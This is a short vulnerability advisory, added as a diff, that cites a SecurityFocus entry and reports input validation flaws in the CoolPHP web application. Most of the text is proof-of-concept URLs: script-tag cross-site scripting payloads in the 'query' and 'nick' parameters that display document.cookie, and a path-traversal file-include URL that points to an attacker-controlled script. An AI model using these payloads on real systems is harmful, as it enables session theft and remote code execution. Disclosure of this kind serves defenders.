@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/11437/info
+
+Reportedly CoolPHP is affected by multiple remote input validation vulnerabilities. These issues are due to a failure of the application to properly sanitize user supplied input prior to using it to make critical actions.
+
+An attacker can leverage these issues to steal cookie-based authentication credentials as well as carry out other malicious activities through cross-site scripting attacks. An attacker can also leverage this issue to execute arbitrary server-side scripts using file include attacks.
+
+Cross-Site Scripting:
+http://www.example.com/index.php?op=buscar&query=<script language=javascript>window.alert(document.cookie);</script>
+http://www.example.com/index.php?op=buscar&query=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?op=userinfo&nick=<script language=javascript>window.alert(document.cookie);</script>
+
+File Include:
+http://www.example.com/index.php?op=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FattackerControlledDirectory/attackerScript.php
